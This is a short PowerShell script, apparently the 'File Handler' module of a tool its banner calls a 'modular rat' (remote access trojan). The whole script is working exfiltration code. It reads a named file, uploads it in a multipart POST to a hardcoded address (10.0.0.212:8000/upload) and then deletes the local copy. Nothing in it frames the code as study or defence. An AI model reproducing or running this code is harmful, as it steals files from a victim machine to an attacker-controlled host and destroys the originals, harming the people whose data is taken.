$file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }

function title {
   Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
   Write-Host "
    _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
   | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
   | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
   |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
   " -ForegroundColor Yellow
   Write-Host "
                       Module : File Handler
   " -ForegroundColor Blue
   Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
   Write-Host ""
}

function upload($file_location) {
   $uri = "http://10.0.0.212:8000/upload"
   $fileBytes = [System.IO.File]::ReadAllBytes($file_location);
   $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
   $boundary = [System.Guid]::NewGuid().ToString(); 
   $LF = "`r`n";
   $bodyLines = ( 
      "--$boundary",
      "Content-Disposition: form-data; name=`"files`"; filename=`"$file_name`"",
      "Content-Type: application/octet-stream$LF",
      $fileEnc,
      "--$boundary--$LF" 
   ) -join $LF

   Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
}

function run() {
   title
   try {
      $location = Get-Item "$file_name" -ErrorAction Stop
      upload($location)
      Remove-Item "$location"
   }
   catch {
      Write-Host "Error while trying to upload file..." -ForegroundColor Red
      Write-Host "Make sure you that the file is present in the current directory!" -ForegroundColor Yellow
      Write-Host "Make sure you have the right file name with the correct extension!" -ForegroundColor Yellow
      exit 
   }
   Write-Host "The file has been sent successfully...:)"-ForegroundColor Green
}

run